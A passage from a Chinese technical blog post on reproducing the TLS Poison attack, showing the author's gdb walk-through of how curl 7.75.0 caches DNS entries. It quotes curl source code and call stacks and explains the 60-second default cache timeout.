r8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/10.jpg" alt=""></p><h2 id="More-Than-TLS-Poison"><a href="#More-Than-TLS-Poison" class="headerlink" title="More Than TLS Poison"></a>More Than TLS Poison</h2><p>接下来就是在复现、探索 TLS Poison 攻击遇到的一些问题以及相应的探索，我觉得其中有一些会比攻击本身更值得探究。</p><h3 id="cURL-DNS-Cache"><a href="#cURL-DNS-Cache" class="headerlink" title="cURL DNS Cache"></a>cURL DNS Cache</h3><p>关于 curl 存在 DNS 缓存的问题，当时复现的时候，即使我们已经设置了 DNS 记录 TTL 为 0 ， curl 也会有一定时间的缓存，这让我当时感到非常诧异，特别想了解 curl 对于 DNS 缓存的处理。</p><p>于是乎，直接 build 了当时最新的 curl 7.75.0 ，抄起 gdb 就开始一顿 debug ，一开始我跟一位 C 语言审计带师调的时候觉得 curl 的代码应该会比较简单…可谁知弄起来还比较麻烦，尤其是对于我这种不是特别熟悉 C 语言的 Web 选手来说，调试坑还是挺多的，尤其 curl 还使用了多线程处理…我在调试的时候还是相当懵逼的，期间也让我学习到了很多调试小技巧。</p><p>curl 在 lib/hostip.c#575 当中会调用<code>Curl_resolv</code>函数，其中又会调用<code>Curl_getaddrinfo</code>函数启动一个新线程去查询 DNS ，其中主要使用了<code>Curl_getaddrinfo_ex</code>封装了<code>getaddrinfo</code>这个 libc 函数，得到的结果会使用<code>Curl_cache_addr</code>进行缓存，而进行缓存主要操作就是 curl 自己维护了一个哈希表，第一次查询得到结果就会使用<code>Curl_cache_addr</code>放入哈希表当中，主要函数实现如下： </p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Curl_cache_addr() stores a 'Curl_addrinfo' struct in the DNS cache.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * When calling Curl_resolv() has resulted in a response with a returned</span></span><br><span class="line"><span class="hljs-comment"> * address, we call this function to store the information in the dns</span></span><br><span class="line"><span class="hljs-comment"> * cache etc</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * Returns the Curl_dns_entry entry pointer or NULL if the storage failed.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-title">Curl_cache_addr</span>(<span class="hljs-title">struct</span> <span class="hljs-title">Curl_easy</span> *<span class="hljs-title">data</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">struct</span> <span class="hljs-title">Curl_addrinfo</span> *<span class="hljs-title">addr</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">const</span> <span class="hljs-title">char</span> *<span class="hljs-title">hostname</span>,</span></span><br><span class="line"><span class="hljs-class">                <span class="hljs-title">int</span> <span class="hljs-title">port</span>)</span></span><br><span class="line"><span class="hljs-class">{</span></span><br><span class="line">  <span class="hljs-keyword">char</span> entry_id[MAX_HOSTCACHE_LEN];</span><br><span class="line">  <span class="hljs-keyword">size_t</span> entry_len;</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns2</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> CURL_DISABLE_SHUFFLE_DNS</span></span><br><span class="line">  <span class="hljs-comment">/* shuffle addresses if requested */</span></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;<span class="hljs-built_in">set</span>.dns_shuffle_addresses) {</span><br><span class="line">    CURLcode result = Curl_shuffle_addr(data, &amp;addr);</span><br><span class="line">    <span class="hljs-keyword">if</span>(result)</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Create a new cache entry */</span></span><br><span class="line">  dns = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(struct Curl_dns_entry));</span><br><span class="line">  <span class="hljs-keyword">if</span>(!dns) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Create an entry id, based upon the hostname and port */</span></span><br><span class="line">  create_hostcache_id(hostname, port, entry_id, <span class="hljs-keyword">sizeof</span>(entry_id));</span><br><span class="line">  entry_len = <span class="hljs-built_in">strlen</span>(entry_id);</span><br><span class="line"></span><br><span class="line">  dns-&gt;inuse = <span class="hljs-number">1</span>;   <span class="hljs-comment">/* the cache has the first reference */</span></span><br><span class="line">  dns-&gt;addr = addr; <span class="hljs-comment">/* this is the address(es) */</span></span><br><span class="line">  time(&amp;dns-&gt;timestamp);</span><br><span class="line">  <span class="hljs-keyword">if</span>(dns-&gt;timestamp == <span class="hljs-number">0</span>)</span><br><span class="line">    dns-&gt;timestamp = <span class="hljs-number">1</span>;   <span class="hljs-comment">/* zero indicates permanent CURLOPT_RESOLVE entry */</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Store the resolved data in our DNS cache. */</span></span><br><span class="line">  dns2 = Curl_hash_add(data-&gt;dns.hostcache, entry_id, entry_len + <span class="hljs-number">1</span>,</span><br><span class="line">                       (<span class="hljs-keyword">void</span> *)dns);</span><br><span class="line">  <span class="hljs-keyword">if</span>(!dns2) {</span><br><span class="line">    <span class="hljs-built_in">free</span>(dns);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  dns = dns2;</span><br><span class="line">  dns-&gt;inuse++;         <span class="hljs-comment">/* mark entry as in-use */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> dns;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中会使用<code>dns-&gt;inuse</code>变量起到一个引用计数的作用，在经过第一次查询得到 DNS 记录之后，再进行 DNS 查询时， curl 会优先在自己的哈希表中查询，如果查到了则又会维护<code>dns-&gt;inuse</code>将其加一。</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Curl_resolv_unlock() unlocks the given cached DNS entry. When this has been</span></span><br><span class="line"><span class="hljs-comment"> * made, the struct may be destroyed due to pruning. It is important that only</span></span><br><span class="line"><span class="hljs-comment"> * one unlock is made for each Curl_resolv() call.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * May be called with 'data' == NULL for global cache.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Curl_resolv_unlock</span><span class="hljs-params">(struct Curl_easy *data, struct Curl_dns_entry *dns)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">if</span>(data &amp;&amp; data-&gt;share)</span><br><span class="line">    Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE);</span><br><span class="line"></span><br><span class="line">  freednsentry(dns);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data &amp;&amp; data-&gt;share)</span><br><span class="line">    Curl_share_unlock(data, CURL_LOCK_DATA_DNS);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * File-internal: release cache dns entry reference, free if inuse drops to 0</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">freednsentry</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *freethis)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">dns</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">Curl_dns_entry</span> *) <span class="hljs-title">freethis</span>;</span></span><br><span class="line">  DEBUGASSERT(dns &amp;&amp; (dns-&gt;inuse&gt;<span class="hljs-number">0</span>));</span><br><span class="line"></span><br><span class="line">  dns-&gt;inuse--;</span><br><span class="line">  <span class="hljs-keyword">if</span>(dns-&gt;inuse == <span class="hljs-number">0</span>) {</span><br><span class="line">    Curl_freeaddrinfo(dns-&gt;addr);</span><br><span class="line">    <span class="hljs-built_in">free</span>(dns);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>通过<code>Curl_resolv_unlock</code>函数在每次通信结束后调用<code>freednsentry</code>将<code>dns-&gt;inuse</code>减一，但是此时结束之后<code>dns-&gt;inuse</code>的值仍为 1 ，所以下次进行 DNS 查询的时候还会使用 hash 里的 DNS 记录，此时的调用栈如下所示（我们这里称为调用栈 A ）：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#<span class="hljs-number">0</span>  freednsentry (freethis=<span class="hljs-number">0x5555555d8728</span>) at hostip.c:<span class="hljs-number">838</span></span><br><span class="line">#<span class="hljs-number">1</span>  <span class="hljs-number">0x00007ffff7f0b20e</span> <span class="hljs-keyword">in</span> Curl_resolv_unlock (data=<span class="hljs-number">0x5555555d8728</span>, dns=<span class="hljs-number">0x5555555d1d38</span>) at hostip.c:<span class="hljs-number">828</span></span><br><span class="line">#<span class="hljs-number">2</span>  <span class="hljs-number">0x00007ffff7f2720e</span> <span class="hljs-keyword">in</span> multi_done (data=<span class="hljs-number">0x5555555d8728</span>, status=CURLE_OK, premature=<span class="hljs-literal">false</span>) at multi.c:<span class="hljs-number">620</span></span><br><span class="line">#<span class="hljs-number">3</span>  <span class="hljs-number">0x00007ffff7f2a902</span> <span class="hljs-keyword">in</span> multi_runsingle (multi=<span class="hljs-number">0x5555555d4d18</span>, nowp=<span class="hljs-number">0x7fffffffdae0</span>, data=<span class="hljs-number">0x5555555d8728</span>) at multi.c:<span class="hljs-number">2227</span></span><br><span class="line">#<span class="hljs-number">4</span>  <span class="hljs-number">0x00007ffff7f2af09</span> <span class="hljs-keyword">in</span> curl_multi_perform (multi=<span class="hljs-number">0x5555555d4d18</span>, running_handles=<span class="hljs-number">0x7fffffffdbd0</span>) at multi.c:<span class="hljs-number">2412</span></span><br><span class="line">#<span class="hljs-number">5</span>  <span class="hljs-number">0x00007ffff7ef75fb</span> <span class="hljs-keyword">in</span> easy_transfer (multi=<span class="hljs-number">0x5555555d4d18</span>) at easy.c:<span class="hljs-number">606</span></span><br><span class="line">#<span class="hljs-number">6</span>  <span class="hljs-number">0x00007ffff7ef7875</span> <span class="hljs-keyword">in</span> easy_perform (data=<span class="hljs-number">0x5555555d8728</span>, events=<span class="hljs-literal">false</span>) at easy.c:<span class="hljs-number">696</span></span><br><span class="line">#<span class="hljs-number">7</span>  <span class="hljs-number">0x00007ffff7ef78e0</span> <span class="hljs-keyword">in</span> curl_easy_perform (data=<span class="hljs-number">0x5555555d8728</span>) at easy.c:<span class="hljs-number">715</span></span><br><span class="line">#<span class="hljs-number">8</span>  <span class="hljs-number">0x000055555557abb9</span> <span class="hljs-keyword">in</span> serial_transfers (global=<span class="hljs-number">0x7fffffffde20</span>, share=<span class="hljs-number">0x5555555d26d8</span>) at tool_operate.c:<span class="hljs-number">2326</span></span><br><span class="line">#<span class="hljs-number">9</span>  <span class="hljs-number">0x000055555557b099</span> <span class="hljs-keyword">in</span> run_all_transfers (global=<span class="hljs-number">0x7fffffffde20</span>, share=<span class="hljs-number">0x5555555d26d8</span>, result=CURLE_OK) at tool_operate.c:<span class="hljs-number">2504</span></span><br><span class="line">#<span class="hljs-number">10</span> <span class="hljs-number">0x000055555557b3d9</span> <span class="hljs-keyword">in</span> operate (global=<span class="hljs-number">0x7fffffffde20</span>, argc=<span class="hljs-number">3</span>, argv=<span class="hljs-number">0x7fffffffdf98</span>) at tool_operate.c:<span class="hljs-number">2620</span></span><br><span class="line">#<span class="hljs-number">11</span> <span class="hljs-number">0x0000555555570991</span> <span class="hljs-keyword">in</span> main (argc=<span class="hljs-number">3</span>, argv=<span class="hljs-number">0x7fffffffdf98</span>) at tool_main.c:<span class="hljs-number">277</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>并且我们也注意到只有当<code>dns-&gt;inuse</code>为 0 的时候， curl 才会将<code>dns-&gt;addr</code>释放掉，所以对于我们来说，需要关注什么时候才能让<code>dns-&gt;inuse</code>为 0 ，也就是说什么时候 curl 会执行两次<code>freednsentry</code> 函数将其减少到了 0 。（因为 curl 当中只有<code>freednsentry</code>函数对<code>dns-&gt;inuse</code>进行了减一操作）</p><p>经过调试，发现 curl 在经过上面的调用栈后，再次经过下面的调用栈（我们这里称为调用栈 B ）会再次调用<code>freednsentry</code>函数将<code>dns-&gt;inuse</code>减少到 0 。</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#<span class="hljs-number">0</span>  freednsentry (freethis=<span class="hljs-number">0x5555556bab48</span>) at hostip.c:<span class="hljs-number">838</span></span><br><span class="line">#1  0x00007ffff7f08c9f in hash_element_dtor (user=0x5555555d2758, element=0x5555555d2b48) at hash.c:41</span><br><span class="line">#2  0x00007ffff7f1d4a5 in Curl_llist_remove (list=0x5555555d19e8, e=0x5555555d2b48, user=0x5555555d2758) at llist.c:130</span><br><span class="line">#3  0x00007ffff7f09283 in Curl_hash_clean_with_criterium (h=0x5555555d2758, user=0x7fffffffd830, comp=0x7ffff7f0a3e9 &lt;hostcache_timestamp_remove&gt;) at hash.c:249</span><br><span class="line">#4  0x00007ffff7f0a494 in hostcache_prune (hostcache=0x5555555d2758, cache_timeout=60, now=1615184672) at hostip.c:217</span><br><span class="line">#5  0x00007ffff7f0a546 in Curl_hostcache_prune (data=0x5555555d8728) at hostip.c:241</span><br><span class="line">#6  0x00007ffff7f2722c in multi_done (data=0x5555555d8728, status=CURLE_OK, premature=false) at multi.c:623</span><br><span class="line">#7  0x00007ffff7f2a902 in multi_runsingle (multi=0x5555555d4d18, nowp=0x7fffffffdae0, data=0x5555555d8728) at multi.c:2227</span><br><span class="line">#8  0x00007ffff7f2af09 in curl_multi_perform (multi=0x5555555d4d18, running_handles=0x7fffffffdbd0) at multi.c:2412</span><br><span class="line">#9  0x00007ffff7ef75fb in easy_transfer (multi=0x5555555d4d18) at easy.c:606</span><br><span class="line">#10 0x00007ffff7ef7875 in easy_perform (data=0x5555555d8728, events=false) at easy.c:696</span><br><span class="line">#11 0x00007ffff7ef78e0 in curl_easy_perform (data=0x5555555d8728) at easy.c:715</span><br><span class="line">#12 0x000055555557abb9 in serial_transfers (global=0x7fffffffde20, share=0x5555555d26d8) at tool_operate.c:2326</span><br><span class="line">#13 0x000055555557b099 in run_all_transfers (global=0x7fffffffde20, share=0x5555555d26d8, result=CURLE_OK) at tool_operate.c:2504</span><br><span class="line">#14 0x000055555557b3d9 in operate (global=0x7fffffffde20, argc=3, argv=0x7fffffffdf98) at tool_operate.c:2620</span><br><span class="line">#15 0x0000555555570991 in main (argc=3, argv=0x7fffffffdf98) at tool_main.c:277</span><br></pre></td></tr></tbody></table></figure><p></p><p>而这两次调用栈的主要关系在<code>multi_done</code>函数中，我们可以在 lib/multi.c#619 处找到如下代码：</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(conn-&gt;dns_entry) {</span><br><span class="line">  Curl_resolv_unlock(data, conn-&gt;dns_entry); <span class="hljs-comment">/* done with this */</span></span><br><span class="line">  conn-&gt;dns_entry = <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line">Curl_hostcache_prune(data);</span><br><span class="line">Curl_safefree(data-&gt;state.ulbuf);</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以讲道理的话，在经过调用栈 A 之后，也就是经过<code>Curl_resolv_unlock</code>函数将<code>inuse</code>减一之后，理论上应该又会经过<code>Curl_hostcache_prune</code>函数将<code>inuse</code>减一才对，但是实际上并没有。而<code>Curl_resolv_unlock</code>函数我们上面看过，并没有什么多余的操作，所以我们需要看一下<code>Curl_hostcache_prune</code>为什么没有将<code>inuse</code>减一。</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Library-wide function for pruning the DNS cache. This function takes and</span></span><br><span class="line"><span class="hljs-comment"> * returns the appropriate locks.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Curl_hostcache_prune</span><span class="hljs-params">(struct Curl_easy *data)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">time_t</span> now;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>((data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout == <span class="hljs-number">-1</span>) || !data-&gt;dns.hostcache)</span><br><span class="line">    <span class="hljs-comment">/* cache forever means never prune, and NULL hostcache means</span></span><br><span class="line"><span class="hljs-comment">       we can't do it */</span></span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;share)</span><br><span class="line">    Curl_share_lock(data, CURL_LOCK_DATA_DNS, CURL_LOCK_ACCESS_SINGLE);</span><br><span class="line"></span><br><span class="line">  time(&amp;now);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Remove outdated and unused entries from the hostcache */</span></span><br><span class="line">  hostcache_prune(data-&gt;dns.hostcache,</span><br><span class="line">                  data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout,</span><br><span class="line">                  now);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(data-&gt;share)</span><br><span class="line">    Curl_share_unlock(data, CURL_LOCK_DATA_DNS);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>好了，看到<code>time_t now</code>就差不多猜到大概了，所以按照之前的现象，<code>Curl_hostcache_prune</code>函数没有将<code>inuse</code>减一，可能是在第一个判断语句就直接返回了，所以接下来我们先检查第一个条件语句当中的条件。</p><p>第一个比较重要的参数<code>data-&gt;set.dns_cache_timeout</code>，在 curl 源码当中唯二对其进行赋值操作的地方在 lib/setopt.c#173 :</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">case</span> CURLOPT_DNS_CACHE_TIMEOUT:</span><br><span class="line">  arg = va_arg(param, <span class="hljs-keyword">long</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span>(arg &lt; <span class="hljs-number">-1</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> CURLE_BAD_FUNCTION_ARGUMENT;</span><br><span class="line">  data-&gt;<span class="hljs-built_in">set</span>.dns_cache_timeout = arg;</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>根据文件名以及上下文，我们不难查到这是对于用户传入的参数进行的配置 <a href="https://curl.se/libcurl/c/CURLOPT_DNS_CACHE_TIMEOUT.html" target="_blank" rel="noopener">CURLOPT_DNS_CACHE_TIMEOUT explained</a> ，并不是我们需要的。还有一处赋值语句则是在 lib/url.c#511 处，在结构体当中对其进行了赋值。</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">set</span>-&gt;dns_cache_timeout = <span class="hljs-number">60</span>; <span class="hljs-comment">/* Timeout every 60 seconds by default */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>并且我们这里还能从注释中获得信息，也就是说如果不是用户自定义参数赋值，默认 DNS 缓存时间为 60s 。</p><p>另一个参数<code>data-&gt;dns.hostcache</code>，我们之前在<code>Curl_hash_add</code>函数中，用作表示哈希记录，这里不为空。也就是说，一般情况下，<code>Curl_hostcache_prune</code>中的第一个条件语句不会直接<code>return</code>，所以我们还需要继续跟进该函数，接下来就到了<code>hostcache_prune</code>函数。</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * Prune the DNS cache. This assumes that a lock has already been taken.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="line">hostcache_prune(struct Curl_hash *hostcache, <span class="hljs-keyword">long</span> cache_timeout, <span class="hljs-keyword">time_t</span> now)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostcache_prune_data</span> <span class="hljs-title">user</span>;</span></span><br><span class="line"></span><br><span class="line">  user.cache_timeout = cache_timeout;</span><br><span class="line">  user.now = now;</span><br><span class="line"></span><br><span class="line">  Curl_hash_clean_with_criterium(hostcache,</span><br><span class="line">                                 (<span class="hljs-keyword">void</span> *) &amp;user,</span><br><span class="line">                                 hostcache_timestamp_remove);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>感觉看到这里已经能很明显的看到 curl 做法的意图了，传入函数的三个参数，第三个参数为现在的时间，第二个参数这里为默认的 DNS 缓存时间为 60s ，进行赋值操作后，进入到<code>hostcache_timestamp_remove</code>函数：</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Cleans all entries that pass the comp function criteria. */</span></span><br><span class="line"><span class="hljs-keyword">void</span></span><br><span class="line">Curl_hash_clean_with_criterium(struct Curl_hash *h, <span class="hljs-keyword">void</span> *user,</span><br><span class="line">                               <span class="hljs-keyword">int</span> (*comp)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">void</span> *))</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist_element</span> *<span class="hljs-title">le</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist_element</span> *<span class="hljs-title">lnext</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_llist</span> *<span class="hljs-title">list</span>;</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span>(!h)</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; h-&gt;slots; ++i) {</span><br><span class="line">    <span class="hljs-built_in">list</span> = &amp;h-&gt;table[i];</span><br><span class="line">    le = <span class="hljs-built_in">list</span>-&gt;head; <span class="hljs-comment">/* get first list entry */</span></span><br><span class="line">    <span class="hljs-keyword">while</span>(le) {</span><br><span class="line">      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_hash_element</span> *<span class="hljs-title">he</span> = <span class="hljs-title">le</span>-&gt;<span class="hljs-title">ptr</span>;</span></span><br><span class="line">      lnext = le-&gt;next;</span><br><span 